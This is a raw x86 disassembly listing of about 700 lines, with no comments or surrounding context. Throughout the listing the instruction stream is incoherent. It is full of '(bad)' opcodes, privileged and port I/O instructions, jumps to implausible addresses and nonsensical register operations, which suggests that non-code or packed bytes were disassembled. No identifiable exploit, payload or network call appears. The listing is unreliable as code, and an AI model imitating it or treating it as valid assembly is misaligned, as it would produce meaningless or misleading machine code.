  429b6a:	clc    
  429b6b:	pop    esi
  429b6c:	ret    0xcaeb
  429b6f:	mov    eax,esi
  429b71:	call   0x5203ec44
  429b76:	dec    ebp
  429b77:	add    eax,0xf8728b
  429b7c:	adc    eax,0xce0ccac9
  429b81:	push   ebp
  429b82:	ret    0xc6ec
  429b85:	in     al,dx
  429b86:	call   0x3342e88f
  429b8b:	push   edi
  429b8c:	add    edi,eax
  429b8e:	xor    eax,eax
  429b90:	jmp    0x429bd7
  429b92:	xor    ecx,DWORD PTR [ecx+0x4503f433]
  429b98:	add    eax,edi
  429b9a:	shr    eax,cl
  429b9c:	mov    DWORD PTR [ebp+0x4545f8f8],eax
  429ba2:	mov    edi,DWORD PTR [ecx]
  429ba4:	in     al,dx
  429ba5:	pushf  
  429ba6:	ret    0x84c7
  429ba9:	fcomp  DWORD PTR [eax-0x7607cd7b]
  429baf:	inc    ebp
  429bb0:	in     al,dx
  429bb1:	cmp    BYTE PTR [ebp-0x64],al
  429bb4:	mov    eax,edi
  429bb6:	cld    
  429bb7:	fmul   st(2),st
  429bb9:	sbb    dl,al
  429bbb:	jmp    0x9c3b:0x374d45c1
  429bc2:	jbe    0x429b8b
  429bc4:	mov    esp,eax
  429bc6:	clc    
  429bc7:	add    BYTE PTR [ebp+0x0],cl
  429bca:	mov    ecx,ecx
  429bcc:	lea    eax,[ebp-0x5]
  429bcf:	mov    edi,edi
  429bd1:	call   0x51cdec1b
  429bd6:	hlt    
  429bd7:	xor    eax,edx
  429bd9:	mov    esi,0x987284
  429bde:	xor    cl,dl
  429be0:	mov    esi,eax
  429be2:	hlt    
  429be3:	into   
  429be4:	inc    ebp
  429be5:	scas   eax,DWORD PTR es:[edi]
  429be6:	mov    ebp,ecx
  429be8:	cld    
  429be9:	add    dl,cl
  429beb:	add    dl,al
  429bed:	inc    ebp
  429bee:	shr    DWORD PTR [ebx],0x4d
  429bf1:	xor    edi,DWORD PTR [ebx]
  429bf3:	mov    DWORD PTR [edi],ecx
  429bf5:	clc    
  429bf6:	dec    esi
  429bf7:	inc    ebp
  429bf8:	dec    DWORD PTR [ebx-0x3d2b1775]
  429bfe:	ret    0xc6ca
  429c01:	mov    BYTE PTR [ebp-0x32],0x53
  429c05:	scas   eax,DWORD PTR es:[edi]
  429c06:	inc    ebp
  429c07:	jmp    0x429c40
  429c09:	mov    ebx,DWORD PTR [esp+edi*8+0x335b4d8b]
  429c10:	pop    ebx
  429c11:	xor    ecx,DWORD PTR [ebp+0x3]
  429c14:	mov    eax,DWORD PTR [ebx]
  429c16:	clc    
  429c17:	test   edx,ecx
  429c19:	mov    ecx,esi
  429c1b:	cld    
  429c1c:	call   0x8ab6e166
  429c21:	xor    ecx,DWORD PTR [eax+0x4533f303]
  429c27:	add    ecx,DWORD PTR [ebx-0x4974072d]
  429c2d:	fdiv   QWORD PTR [ebx]
  429c2f:	retf   0xce89
  429c32:	in     al,0xc1
  429c34:	inc    ebp
  429c35:	or     cl,BYTE PTR [ebx-0x3d3d1b36]
  429c3b:	into   
  429c3c:	mov    dh,0xc1
  429c3f:	call   0x8c16e1c8
  429c44:	(bad)  
  429c45:	cld    
  429c46:	mov    ecx,DWORD PTR [ebp-0x14]
  429c49:	xor    eax,ecx
  429c4b:	lea    eax,[ebp+0x8]
  429c4e:	mov    esi,DWORD PTR [edx-0x4]
  429c51:	add    dl,al
  429c53:	inc    ebp
  429c54:	mov    esp,0x32d8988b
  429c59:	dec    ebp
  429c5a:	mov    esi,DWORD PTR [ebx]
  429c5c:	cld    
  429c5d:	xor    eax,edx
  429c5f:	sub    ebp,DWORD PTR [eax-0x75]
  429c62:	int    0xec
  429c64:	sub    ecx,eax
  429c66:	add    esp,DWORD PTR [ecx-0x74b2ba20]
  429c6c:	mov    esi,esp
  429c6e:	call   0x3416e9f7
  429c73:	inc    DWORD PTR [ebx]
  429c75:	mov    edi,DWORD PTR [ebx]
  429c77:	cld    
  429c78:	jne    0x429cc7
  429c7a:	mov    esi,DWORD PTR [ebx]
  429c7c:	aam    0x8d
  429c7e:	dec    ebp
  429c7f:	or     BYTE PTR [ebx],dh
  429c81:	jb     0x429c86
  429c83:	add    BYTE PTR [edi+0x45],bl
  429c86:	ror    DWORD PTR [ebx+0x4d55e4c9],0xec
  429c8d:	xor    ebp,esp
  429c8f:	xor    eax,edi
  429c91:	sub    edi,esp
  429c93:	mov    eax,DWORD PTR [ebp+0x39c8f8f4]
  429c99:	xchg   BYTE PTR [edi+edi*8+0x45e8ff89],bl
  429ca0:	inc    ebp
  429ca1:	xor    ecx,DWORD PTR [ecx+0x45891403]
  429ca7:	clc    
  429ca8:	mov    eax,edi
  429caa:	nop
  429cab:	fadd   QWORD PTR [eax]
  429cad:	xchg   BYTE PTR [ebx+0xdb14f8],cl
  429cb3:	jmp    0x429c3e
  429cb5:	mov    eax,DWORD PTR [ecx]
  429cb7:	fadd   DWORD PTR [eax]
  429cb9:	inc    ebp
  429cba:	or     DWORD PTR [ebx],esi
  429cbc:	dec    eax
  429cbd:	add    edx,DWORD PTR [ebx-0x2d]
  429cc0:	dec    ebp
  429cc1:	mov    DWORD PTR [ebx+0x5707fcec],ecx
  429cc7:	inc    ebp
  429cc8:	push   eax
  429cc9:	mov    dl,BYTE PTR [ecx-0xd]
  429ccc:	xor    ecx,DWORD PTR [ebp-0x45]
  429ccf:	(bad)  
  429cd1:	rol    BYTE PTR [eax],0xc1
  429cd4:	ret    
  429cd5:	inc    ebp
  429cd6:	inc    ebp
  429cd7:	mov    ecx,DWORD PTR [ebx-0x38b20324]
  429cdd:	xor    eax,ebx
  429cdf:	add    eax,DWORD PTR [ebp+0x23]
  429ce2:	mov    ecx,DWORD PTR [ebx-0x4bf7a08]
  429ce8:	cmp    edi,0xc
  429ceb:	dec    ebp
  429cec:	inc    ebp
  429ced:	xor    ecx,DWORD PTR [ebx+0x40f8f889]
  429cf3:	inc    ebp
  429cf4:	mov    esi,DWORD PTR [ebx]
  429cf6:	clc    
  429cf7:	lea    eax,[ebp+0x45725407]
  429cfd:	add    BYTE PTR [ebp+eax*2-0x75],dh
  429d01:	xor    edi,DWORD PTR [eax]
  429d03:	mov    ecx,0xff8b8d4d
  429d08:	push   esp
  429d09:	enter  0x4df7,0x23
  429d0d:	mov    DWORD PTR [ebx+0x4045f8e0],ecx
  429d13:	mov    eax,DWORD PTR [ebx]
  429d15:	loopne 0x429d02
  429d17:	ret    0xc68b
  429d1a:	push   esp
  429d1b:	enter  0x9745,0x8b
  429d1f:	inc    ebp
  429d20:	cld    
  429d21:	mov    eax,edi
  429d23:	clc    
  429d24:	ret    
  429d25:	ret    0xc645
  429d28:	mov    esi,DWORD PTR [ebx]
  429d2a:	cld    
  429d2b:	pop    esi
  429d2c:	mov    ebx,0x83458bc3
  429d32:	mov    ebp,DWORD PTR [esp+edi*8+0x45]
  429d36:	dec    ebp
  429d37:	cmp    BYTE PTR [ebx],dh
  429d39:	pushf  
  429d3a:	add    edi,DWORD PTR [edx-0x7767a77]
  429d40:	fcom   DWORD PTR [ebp+0x45]
  429d43:	mov    edi,DWORD PTR [edx]
  429d45:	adc    al,0x9c
  429d47:	inc    ebp
  429d48:	(bad)  
  429d49:	mov    ebx,eax
  429d4b:	adc    al,0x85
  429d4d:	cmp    al,0x1
  429d50:	inc    ebp
  429d51:	add    BYTE PTR [ecx*2-0x74167464],bh
  429d58:	add    edx,DWORD PTR [eax-0x74bb0000]
  429d5e:	xor    eax,DWORD PTR [ebx]
  429d60:	add    edi,DWORD PTR [ecx+ecx*4]
  429d63:	mov    esp,esi
  429d65:	clc    
  429d66:	inc    ebp
  429d67:	inc    ebp
  429d68:	add    edx,DWORD PTR [esi+0xc]
  429d6b:	mov    edi,0x7ff0845
  429d70:	in     al,dx
  429d71:	(bad)  
  429d72:	jne    0x429d0c
  429d74:	mov    esi,DWORD PTR [edx]
  429d76:	clc    
  429d77:	add    ebp,DWORD PTR [edx]
  429d79:	mov    edi,edi
  429d7b:	in     al,dx
  429d7c:	mov    DWORD PTR [ebp-0x10],eax
  429d7f:	xor    eax,DWORD PTR [ebp+0x3]
  429d82:	and    BYTE PTR [ecx+0x458bf49c],cl
  429d88:	fmul   DWORD PTR [ebx-0x173caf39]
  429d8e:	lea    ecx,[ecx+0x45e8d4bc]
  429d94:	clc    
  429d95:	mov    edi,edi
  429d97:	cmp    BYTE PTR [ebp+0x4d],al
  429d9a:	test   DWORD PTR [eax+0x74],ecx
  429d9d:	inc    ecx
  429d9e:	mov    ecx,DWORD PTR [ebx+0x18c7f8d8]
  429da4:	ret    
  429da5:	inc    eax
  429da6:	dec    DWORD PTR [ebx+0x4945f8f0]
  429dac:	push   eax
  429dad:	dec    eax
  429dae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429daf:	sar    bh,1
  429db1:	enter  0x458b,0xec
  429db5:	mov    eax,DWORD PTR [ebp+0x38]
  429db8:	mov    eax,ecx
  429dba:	fadd   DWORD PTR [ebx]
  429dbc:	dec    ebp
  429dbd:	inc    eax
  429dbe:	sub    ecx,DWORD PTR [ecx+0x45d81489]
  429dc4:	inc    ebp
  429dc5:	xor    ecx,DWORD PTR [ebx+0x4089f003]
  429dcb:	fadd   QWORD PTR [ebx]
  429dcd:	inc    ebp
  429dce:	or     al,0x33
  429dd0:	dec    ebp
  429dd1:	add    edi,DWORD PTR [ebx]
  429dd3:	mov    DWORD PTR [edx-0x28],esi
  429dd6:	mov    eax,DWORD PTR [ebp-0x10]
  429dd9:	mov    eax,DWORD PTR [eax+0x10]
  429ddc:	mov    eax,edi
  429dde:	lock ret 
  429de0:	inc    ecx
  429de1:	add    DWORD PTR [ebx-0x3e3827ab],ecx
  429de7:	fsubr  st,st(5)
  429de9:	test   DWORD PTR [eax],eax
  429deb:	clc    
  429dec:	push   0x45
  429dee:	(bad)  
  429def:	cmp    ebp,esp
  429df1:	pushf  
  429df2:	inc    ebp
  429df3:	(bad)  
  429df4:	push   eax
  429df5:	fcomp  DWORD PTR [ebp+eax*4-0x1]
  429df9:	clc    
  429dfa:	mov    eax,0xf8008584
  429dff:	mov    eax,DWORD PTR [ebp-0x4]
  429e02:	mov    edi,0x4585c3cc
  429e08:	clc    
  429e09:	mov    eax,DWORD PTR [ebp+0x14]
  429e0c:	cmp    al,BYTE PTR [ebp-0x64]
  429e0f:	mov    edi,eax
  429e11:	in     al,dx
  429e12:	les    esi,FWORD PTR [ebp-0x7b]
  429e15:	mov    edi,eax
  429e17:	or     al,0x4d
  429e19:	dec    ebp
  429e1a:	mov    eax,ebp
  429e1c:	in     al,0xf2
  429e1e:	dec    ebp
  429e1f:	dec    DWORD PTR [ecx+0x4dc7e045]
  429e25:	fmul   DWORD PTR [ecx+0x4df8f085]
  429e2b:	inc    ebp
  429e2c:	mov    DWORD PTR [ebx],esi
  429e2e:	fadd   QWORD PTR [ebx]
  429e30:	dec    ebp
  429e31:	push   eax
  429e32:	xor    eax,DWORD PTR [ebp+0x3]
  429e35:	push   eax
  429e36:	mov    DWORD PTR [eax],ebx
  429e38:	fdivr  st,st(7)
  429e3a:	test   BYTE PTR [ebx-0x3fc21000],0x85
  429e41:	dec    esi
  429e42:	clc    
  429e43:	inc    ebp
  429e44:	test   BYTE PTR [ebx],dh
  429e46:	add    DWORD PTR [ebx],eax
  429e48:	add    BYTE PTR [eax+0x4d],dl
  429e4b:	jne    0x429e80
  429e4d:	lea    ecx,[ebx-0x7617fc44]
  429e53:	div    ah
  429e55:	inc    DWORD PTR [ebp+0x45]
  429e58:	xor    ecx,DWORD PTR [ecx+0x4530d88d]
  429e5e:	jb     0x429deb
  429e60:	add    BYTE PTR [eax*2-0x17ba743f],cl
  429e67:	mov    ecx,DWORD PTR [ebp-0x10]
  429e6a:	xor    ecx,DWORD PTR [ebp+0x3]
  429e6d:	mov    edi,DWORD PTR [ebx]
  429e6f:	adc    BYTE PTR [ebp+0x41],dh
  429e72:	mov    ecx,DWORD PTR [ebx-0x37382704]
  429e78:	ret    
  429e79:	push   ss
  429e7a:	push   0x45
  429e7c:	lea    ecx,[ebx+0x4de80cb0]
  429e82:	sti    
  429e83:	add    edi,edi
  429e85:	or     BYTE PTR [ebp+0x4d],al
  429e88:	mov    ebp,DWORD PTR [ebx]
  429e8a:	xor    ebp,ecx
  429e8c:	mov    al,BYTE PTR [edx]
  429e8e:	add    eax,0xc7200
  429e93:	jne    0x429ee2
  429e95:	lea    esi,[ebx]
  429e97:	mov    al,0xf
  429e99:	call   0xe955e
  429e9e:	sar    DWORD PTR [eax],0x84
  429ea1:	pushf  
  429ea2:	add    DWORD PTR [ecx+0x4545d000],ecx
  429ea8:	mov    edi,DWORD PTR [ecx]
  429eaa:	xor    ebx,DWORD PTR [edx+ecx*4+0x72c805c7]
  429eb1:	test   DWORD PTR [eax],eax
  429eb3:	clc    
  429eb4:	dec    ebp
  429eb5:	inc    ebp
  429eb6:	xor    edi,DWORD PTR [ebx]
  429eb8:	setl   al
  429ebb:	(bad)  
  429ebc:	retf   
  429ebd:	rol    cl,1
  429ebf:	dec    ebp
  429ec0:	test   BYTE PTR [ebp+0x4d00cc01],cl
  429ec6:	inc    ebp
  429ec7:	lea    ecx,[ebx-0x75b2cc38]
  429ecd:	lea    eax,ds:0x4d72c4
  429ed3:	mov    ecx,DWORD PTR [ebp-0x4]
  429ed6:	xor    ecx,edi
  429ed8:	bswap  ebx
  429eda:	ror    BYTE PTR [ebp-0x35],0xe9
  429ede:	rol    DWORD PTR [ecx],0x84
  429ee1:	add    BYTE PTR [ecx],al
  429ee3:	cmp    al,BYTE PTR [eax]
  429ee5:	pushf  
  429ee6:	inc    ebp
  429ee7:	jnp    0x8a42d2ea
  429eed:	mov    eax,DWORD PTR ds:0xcf72e8
  429ef3:	lock dec ebp
  429ef5:	retf   
  429ef6:	xor    ecx,DWORD PTR [ebp+0xf]
  429ef9:	mov    eax,eax
  429efb:	fmul   st,st(3)
  429efd:	test   ecx,0x1988484
  429f03:	xor    al,BYTE PTR [eax]
  429f05:	mov    DWORD PTR [ebp-0x28],eax
  429f08:	mov    eax,DWORD PTR [ebp+0x33]
  429f0b:	mov    ecx,DWORD PTR [edx+0x72c705d8]
  429f11:	ret    
  429f12:	add    al,cl
  429f14:	dec    ebp
  429f15:	adc    ecx,DWORD PTR [ebx-0x75ccccbb]
  429f1b:	add    ecx,DWORD PTR ds:0xc7250
  429f21:	inc    ebp
  429f22:	rcl    DWORD PTR [eax+0x4d],0x27
  429f26:	mov    edi,edi
  429f28:	xor    ecx,DWORD PTR [ebx+0xde48a]
  429f2e:	jb     0x429ef7
  429f30:	add    BYTE PTR [ecx+eax*8-0x74cdb2b8],al
  429f37:	mov    esi,DWORD PTR [ebx]
  429f39:	cld    
  429f3a:	mov    cl,bh
  429f3c:	or     eax,0x372b6
  429f41:	cmp    ecx,eax
  429f43:	jne    0x429fc0
  429f49:	mov    eax,DWORD PTR [ebp-0x20]
  429f4c:	mov    eax,DWORD PTR [eax]
  429f4e:	xor    eax,edi
  429f50:	mov    al,BYTE PTR [ebp+eax*1+0x327248]
  429f57:	mov    ecx,DWORD PTR [ebp-0x4]
  429f5a:	mov    ecx,edi
  429f5c:	xor    esi,DWORD PTR [esi+0x3b0d038a]
  429f62:	jb     0x429f73
  429f64:	add    BYTE PTR [edi-0x3f],dl
  429f67:	add    BYTE PTR [ebp-0x75],cl
  429f6a:	mov    esi,eax
  429f6c:	xor    eax,DWORD PTR [eax]
  429f6e:	mov    al,bh
  429f70:	or     eax,0x487284
  429f75:	xor    al,cl
  429f77:	mov    ecx,DWORD PTR [ebp-0x4]
  429f7a:	mov    ecx,edi
  429f7c:	xor    esi,DWORD PTR [esi+0x3b0d038a]
  429f82:	jb     0x429f93
  429f84:	add    BYTE PTR [edi],dh
  429f86:	enter  0x8500,0x8b
  429f8a:	add    ah,bl
  429f8c:	add    BYTE PTR [eax],al
  429f8e:	inc    ebp
  429f8f:	(bad)  
  429f90:	mov    eax,DWORD PTR [ebx+esi*1+0x5328a48]
  429f97:	mov    esi,DWORD PTR [edx-0x4]
  429f9a:	add    bh,cl
  429f9c:	dec    ebp
  429f9d:	mov    dh,0x8b
  429f9f:	add    esi,DWORD PTR [ebx]
  429fa1:	cmp    ecx,DWORD PTR [edx+0x72170d0f]
  429fa7:	add    BYTE PTR [eax],al
  429fa9:	mov    eax,ecx
  429fab:	loopne 0x429ffa
  429fad:	add    BYTE PTR [ebx-0x757bcc39],cl
  429fb3:	dec    eax
  429fb4:	or     eax,0x8b7232
  429fb9:	in     al,0xc1
  429fbb:	or     DWORD PTR [ebp-0x31],ecx
  429fbe:	mov    ecx,DWORD PTR [ebx+esi*1+0xd328a48]
  429fc5:	xor    dh,BYTE PTR [edx-0x75]
  429fc8:	add    al,dh
  429fca:	enter  0x4f09,0xcf
  429fce:	inc    ebp
  429fcf:	mov    WORD PTR [ebx-0x75cdccb8],cs
  429fd5:	or     al,BYTE PTR ds:0xe4728b
  429fdb:	or     DWORD PTR [ebp-0x31],ecx
  429fde:	mov    ecx,DWORD PTR [ebx+esi*1+0xd328a4c]
  429fe5:	cmp    dh,BYTE PTR [edx+0xf]
  429fe8:	add    bl,dl
  429fea:	rol    DWORD PTR [eax],0x4d
  429fed:	mov    ecx,DWORD PTR [ebx-0x75ffcc10]
  429ff3:	(bad)  
  429ff4:	or     eax,0x487284
  429ff9:	xor    al,cl
  429ffb:	mov    ecx,DWORD PTR [ebp-0x20]
  429ffe:	mov    ecx,DWORD PTR [ecx]
  42a000:	xor    ecx,edi
  42a002:	mov    cl,BYTE PTR [ebp+ecx*1+0x327248]
  42a009:	xor    cl,al
  42a00b:	mov    ecx,DWORD PTR [edi]
  42a00d:	fadd   QWORD PTR [ebp+0x9]
  42a010:	call   0xffcf9ae4
  42a015:	dec    eax
  42a016:	dec    ebp
  42a017:	xor    bh,BYTE PTR [ebx]
  42a019:	or     dh,BYTE PTR [ebx+ecx*4-0x75]
  42a01d:	loopne 0x42a01b
  42a01f:	or     edi,eax
  42a021:	iret   
  42a022:	ret    
  42a023:	mov    WORD PTR [ebp+0x4c],es
  42a026:	mov    esi,DWORD PTR [edx]
  42a028:	call   0x84526767
  42a02d:	(bad)  
  42a02e:	cwde   
  42a02f:	add    BYTE PTR [edx],dh
  42a031:	mov    esi,DWORD PTR [ebx]
  42a033:	fmul   QWORD PTR [ebx+0x55c7fc00]
  42a039:	test   BYTE PTR [ebx],dh
  42a03b:	dec    eax
  42a03c:	add    esi,DWORD PTR [edx]
  42a03e:	cmp    ecx,DWORD PTR [ebx+0x9f8f00f]
  42a044:	dec    edi
  42a046:	mov    ecx,DWORD PTR [esp+edi*8+0x33324d48]
  42a04d:	xor    al,BYTE PTR [ebx]
  42a04f:	mov    edi,DWORD PTR [ebx]
  42a051:	in     al,0x75
  42a053:	or     DWORD PTR [ebx+0x4d8ce8cf],ecx
  42a059:	dec    eax
  42a05a:	xor    esi,DWORD PTR [edx]
  42a05c:	lea    ecx,[edx]
  42a05e:	or     BYTE PTR [ebx+0x900f072],cl
  42a064:	ja     0x42a035
  42a066:	sbb    BYTE PTR [ebp+esi*2-0x67cd72b4],cl
  42a06d:	cmp    ch,al
  42a06f:	jne    0x42a064
  42a071:	mov    edi,edi
  42a073:	fadd   QWORD PTR [ebp+0x0]
  42a076:	mov    eax,edi
  42a078:	fadd   DWORD PTR [edi+eax*8-0x3ecd3cb8]
  42a07f:	mov    edx,DWORD PTR [ebx]
  42a081:	in     al,0x45
  42a083:	or     DWORD PTR [ebx],esi
  42a085:	iret   
  42a086:	add    ecx,DWORD PTR [eax+edx*2+0x45321848]
  42a08d:	xor    dl,BYTE PTR [eax-0x75]
  42a090:	sbb    al,ah
  42a092:	dec    DWORD PTR [ecx]
  42a094:	mov    ecx,edi
  42a096:	in     al,dx
  42a097:	mov    eax,es
  42a099:	dec    eax
  42a09a:	mov    DWORD PTR [edx],esi
  42a09c:	fmul   QWORD PTR [edx]
  42a09e:	jne    0x42a02b
  42a0a0:	(bad)  
  42a0a1:	(bad)  
  42a0a3:	or     DWORD PTR [ebp-0x31],eax
  42a0a6:	add    ecx,DWORD PTR [eax+ecx*1-0xccd17b4]
  42a0ad:	cmp    bh,bh
  42a0af:	jne    0x42a0f6
  42a0b1:	lea    ecx,[ebx-0x38372750]
  42a0b7:	inc    ebx
  42a0b9:	mov    eax,ecx
  42a0bb:	mov    eax,0xa00c111
  42a0c0:	jne    0x42a107
  42a0c2:	mov    esi,DWORD PTR [ebx]
  42a0c4:	test   al,0x3
  42a0c6:	inc    ebp
  42a0c7:	mov    DWORD PTR [eax-0xc],edx
  42a0ca:	fiadd  WORD PTR [ebp-0x1]
  42a0cd:	xor    ecx,DWORD PTR [ebx+0x4d30108d]
  42a0d3:	jb     0x42a0d6
  42a0d5:	add    BYTE PTR [ebx+0x454dacc7],cl
  42a0db:	mov    ecx,DWORD PTR [ecx+0x45cf14f4]
  42a0e1:	retf   
  42a0e2:	mov    edx,ecx
  42a0e4:	adc    al,0x84
  42a0e6:	(bad)  
  42a0e7:	std    
  42a0e8:	ret    
  42a0e9:	jmp    FWORD PTR [edi-0x2b7474bb]
  42a0ef:	hlt    
  42a0f0:	rol    edi,0x82
  42a0f3:	ret    
  42a0f4:	cld    
  42a0f5:	enter  0x11ff,0x45
  42a0f9:	inc    ebp
  42a0fa:	pop    edi
  42a0fb:	mov    ebx,DWORD PTR [ebx+0x14]
  42a0fe:	ret    0xc7
  42a101:	test   BYTE PTR [ebx+0x45325198],cl
  42a107:	jmp    0x42a094
  42a109:	push   0x8
  42a10b:	call   DWORD PTR [esi]
  42a10d:	in     al,dx
  42a10e:	add    BYTE PTR [ebp+0x1],0x50
  42a112:	add    bl,ah
  42a114:	add    bh,bh
  42a116:	icebp  
  42a117:	mov    ecx,DWORD PTR [eax]
  42a119:	cld    
  42a11a:	pop    es
  42a11b:	dec    ebp
  42a11c:	shl    DWORD PTR [ebx],0x72
  42a11f:	add    eax,DWORD PTR [eax]
  42a121:	cmp    edx,ecx
  42a123:	je     0x42a135
  42a125:	mov    esi,DWORD PTR [ebp-0x4]
  42a128:	inc    edi
  42a12a:	or     al,0xc3
  42a12c:	jmp    FWORD PTR [edx-0x18]
  42a12f:	(bad)  
  42a130:	sti    
  42a131:	cwde   
  42a132:	(bad)  
  42a133:	call   0xffa09a3e
  42a138:	or     al,0x45
  42a13a:	push   ebp
  42a13b:	sub    esp,0x18
  42a13e:	push   ebx
  42a13f:	inc    ebp
  42a140:	mov    edi,edi
  42a142:	mov    ebp,DWORD PTR [eax+ecx*1+0x578b4d75]
  42a149:	test   al,0x50
  42a14b:	inc    ebp
  42a14c:	push   ecx
  42a14d:	push   eax
  42a14e:	xor    esp,DWORD PTR [edi-0x748d0041]
  42a154:	add    ah,bh
  42a156:	(bad)  
  42a157:	dec    ebp
  42a158:	add    DWORD PTR [ebx],esi
  42a15a:	inc    ebp
  42a15b:	add    ecx,DWORD PTR [ebx+0x74943b]
  42a161:	push   0xffffff8b
  42a163:	dec    DWORD PTR [ebx-0x7fbaeb54]
  42a169:	add    eax,DWORD PTR [ecx]
  42a16b:	or     BYTE PTR [eax],al
  42a16d:	call   0xff849972
  42a172:	mov    eax,DWORD PTR [ebp+0x14]
  42a175:	mov    ecx,DWORD PTR [ecx+0x801ac]
  42a17b:	inc    ebp
  42a17c:	dec    ecx
  42a17d:	add    ebp,DWORD PTR [edx+0x14]
  42a180:	push   0x8b3045
  42a185:	call   0x33aceefa
  42a18a:	inc    DWORD PTR [ebx]
  42a18c:	mov    DWORD PTR [edi],ecx
  42a18e:	mov    eax,ecx
  42a190:	or     BYTE PTR [ebp-0x3d],cl
  42a193:	cmp    eax,edi
  42a195:	cmovne esp,DWORD PTR [ebx+ecx*4-0x1]
  42a19a:	adc    BYTE PTR [ebx+0x5eff0845],cl
  42a1a0:	adc    al,0xc9
  42a1a2:	inc    ebp
  42a1a3:	adc    BYTE PTR [eax+0x55],dl
  42a1a6:	jne    0x42a194
  42a1a8:	call   0xff53a138
  42a1ad:	dec    ebp
  42a1ae:	inc    ebp
  42a1af:	mov    ecx,DWORD PTR [ebx+0x390338b]
  42a1b5:	add    BYTE PTR [ebx],bh
  42a1b7:	mov    esi,DWORD PTR [ecx+eax*4-0x75]
  42a1bb:	push   eax
  42a1bc:	or     al,0x51
  42a1be:	dec    ebp
  42a1bf:	xor    DWORD PTR [ebx],0xf320398
  42a1c5:	cmp    eax,DWORD PTR [ebp+0x74]
  42a1c8:	mov    edi,edi
  42a1ca:	pop    edi
  42a1cb:	adc    BYTE PTR [ebx+0x75],bl
  42a1ce:	ret    0x50
  42a1d1:	mov    edx,DWORD PTR ss:[edi-0x7d]
  42a1d5:	(bad)  
  42a1d6:	clc    
  42a1d7:	mov    esp,ebp
  42a1d9:	pop    ecx
  42a1da:	mov    ecx,0xf80085c2
  42a1df:	mov    ecx,DWORD PTR [ecx+edx*2]
  42a1e2:	push   esi
  42a1e3:	push   esi
  42a1e4:	(bad)  
  42a1e5:	lock add DWORD PTR [ebp+0x44],eax
  42a1e9:	mov    edx,DWORD PTR [eax]
  42a1eb:	adc    BYTE PTR [ebx+edi*4+0x8],bh
  42a1ef:	or     BYTE PTR [eax+0x7],dl
  42a1f2:	push   ecx
  42a1f3:	ret    
  42a1f4:	xor    ebx,DWORD PTR [eax+0x37232be]
  42a1fa:	add    BYTE PTR [ecx+0x147c8bfe],cl
  42a200:	or     al,0x80
  42a202:	jge    0x42a205
  42a204:	mov    DWORD PTR [eax],eax
  42a206:	and    al,0x8
  42a208:	cmp    DWORD PTR [ebp+0x10],eax
  42a20b:	mov    edx,DWORD PTR [esi]
  42a20d:	xchg   esp,eax
  42a20e:	dec    esp
  42a20f:	add    BYTE PTR [eax],dl
  42a211:	mov    ecx,edx
  42a213:	add    edx,DWORD PTR [esp+edi*1+0x8]
  42a217:	dec    ebp
  42a218:	into   
  42a219:	mov    ebp,DWORD PTR [edi+0x240089d8]
  42a21f:	mov    edx,DWORD PTR [eax+0x14]
  42a222:	das    
  42a223:	add    al,0x45
  42a225:	add    BYTE PTR [ebp+0x0],dh
  42a228:	mov    edi,edi
  42a22a:	and    al,0x50
  42a22c:	mov    eax,DWORD PTR [eax]
  42a22e:	and    al,0xd1
  42a230:	xor    eax,DWORD PTR [esi]
  42a232:	lea    eax,[ebp+0x8]
  42a235:	xor    esi,DWORD PTR [edx+0x3]
  42a238:	add    BYTE PTR [ecx+0x4510fc44],cl
  42a23e:	cmp    cl,BYTE PTR [ebx+0x75eb0c9c]
  42a244:	or     DWORD PTR [ebp-0x7a03f0],0x541608f8
  42a24e:	cmp    edi,edi
  42a250:	pushf  
  42a251:	mov    edi,edi
  42a253:	or     BYTE PTR [esi+ecx*1],cl
  42a256:	jne    0x42a21b
  42a258:	call   0xba224
  42a25d:	adc    BYTE PTR [ebp+eax*2+0xc],al
  42a261:	mov    ebx,DWORD PTR [eax]
  42a263:	adc    BYTE PTR [ebx+eax*8+0x14],dh
  42a267:	mov    DWORD PTR [edi+ebp*4-0x73],0x750110fc
  42a26f:	pop    esi
  42a270:	dec    ecx
  42a272:	and    al,0x10
  42a274:	call   DWORD PTR [ebp+0x24]
  42a277:	in     al,dx
  42a278:	call   0xffc6a161
  42a27d:	adc    BYTE PTR [eax+edi*1+0xc],al
  42a281:	pushf  
  42a282:	pop    esi
  42a283:	mov    ebp,esp
  42a285:	and    al,0xc2
  42a287:	push   edi
  42a288:	add    BYTE PTR [ecx+0x3a],al
  42a28b:	mov    DWORD PTR [ebp+0x24],esi
  42a28e:	test   DWORD PTR [ebx-0x45f7db8b],ecx
  42a294:	dec    DWORD PTR [eax]
  42a296:	and    al,0x7
  42a298:	(bad)  
  42a299:	cli    
  42a29a:	and    al,0x98
  42a29c:	or     BYTE PTR [edx],dh
  42a29e:	sbb    BYTE PTR [ebx],al
  42a2a0:	adc    al,0x89
  42a2a2:	jmp    DWORD PTR [esp]
  42a2a5:	mov    ecx,DWORD PTR [ebx+0x1c7c0c0c]
  42a2ab:	adc    al,0x8
  42a2ad:	dec    ebp
  42a2ae:	adc    BYTE PTR [ebp-0x7c],dh
  42a2b1:	mov    esi,DWORD PTR [edx]
  42a2b3:	and    al,0x24
  42a2b5:	xor    eax,DWORD PTR [ebp-0x63dbf175]
  42a2bb:	add    edi,eax
  42a2bd:	pcmpeqb mm1,mm2
  42a2c0:	jmp    0x42a30e
  42a2c2:	dec    DWORD PTR [eax]
  42a2c4:	je     0x42a2b1
  42a2c6:	mov    edi,DWORD PTR [ecx]
  42a2c8:	pop    ebp
  42a2c9:	adc    BYTE PTR [esp+ecx*2-0x3e],al
  42a2cd:	cwde   
  42a2ce:	mov    DWORD PTR [eax-0x8],ebp
  42a2d1:	jge    0x42a33b
  42a2d3:	dec    DWORD PTR [ecx+0x5fbf7424]
  42a2d9:	push   ecx
  42a2da:	push   edi
  42a2db:	adc    BYTE PTR [eax],al
  42a2dd:	hlt    
  42a2de:	sub    al,0x10
  42a2e0:	add    ch,dl
  42a2e2:	adc    BYTE PTR es:[eax],al
  42a2e5:	adc    BYTE PTR ds:0xe860010,0x10
  42a2ec:	add    BYTE PTR [ecx-0x72ffeffa],dl
  42a2f2:	push   ds
  42a2f3:	adc    BYTE PTR [eax],al
  42a2f5:	repnz sbb DWORD PTR [eax],edx
  42a2f8:	add    BYTE PTR [eax+0x3001052],ch
  42a2fe:	or     DWORD PTR [eax],edx
  42a300:	add    ch,ch
  42a302:	pusha  
  42a303:	adc    BYTE PTR [eax],al
  42a305:	fldenv [edx-0x5d22ffbe]
  42a30b:	inc    edx
  42a30c:	add    cl,ah
  42a30e:	mov    ds:0xa2e50042,al
  42a313:	inc    edx
